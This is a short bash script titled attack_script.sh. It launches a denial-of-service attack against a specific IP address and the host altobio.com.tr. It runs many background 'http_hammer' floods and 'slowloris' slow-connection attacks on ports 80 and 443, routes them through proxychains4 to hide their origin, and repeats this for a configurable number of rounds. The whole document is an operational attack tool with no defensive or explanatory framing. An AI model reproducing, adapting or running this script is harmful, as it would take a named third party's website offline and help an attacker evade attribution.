#!/bin/bash
# attack_script.sh

DEF_ITERATION=50

if [ "$1" == "-i" ]; then
  spawn_cnt="$2"
else
  spawn_cnt="$DEF_ITERATION"
fi

# Kill any existing processes first
killall -9 http_hammer >/dev/null 2>&1
killall -9 slowloris >/dev/null 2>&1
killall -9 proxychains4 >/dev/null 2>&1

# Launch instances properly
echo "Spawning $spawn_cnt instances."

for i in $(seq 1 $spawn_cnt); do
  echo "Starting instance $i..."

  # HTTP Hammer attacks
  nohup proxychains4 -q ./http_hammer 212.154.119.31 -H altobio.com.tr -t 200 -p 80 >/dev/null 2>&1 &
  sleep 0.5
  nohup proxychains4 -q ./http_hammer 212.154.119.31 -H altobio.com.tr -t 200 -p 443 --https >/dev/null 2>&1 &
  sleep 0.5

  # Slowloris attacks with proxychains
  nohup proxychains4 -q ./slowloris 212.154.119.31 -H altobio.com.tr -t 12 -c 18 -p 80 -T 120 >/dev/null 2>&1 &
  sleep 0.5
  nohup proxychains4 -q ./slowloris 212.154.119.31 -H altobio.com.tr -t 12 -c 18 -p 443 --https -T 120 >/dev/null 2>&1 &
  sleep 0.5
  nohup proxychains4 -q ./slowloris 212.154.119.31 -H altobio.com.tr -t 8 -c 15 -p 80 -T 90 >/dev/null 2>&1 &
  sleep 0.5
done

echo "All instances running in background"
echo "Monitor with: ps aux | grep -E '(http_hammer|slowloris)' | wc -l"
echo "Stop all with: killall http_hammer slowloris"
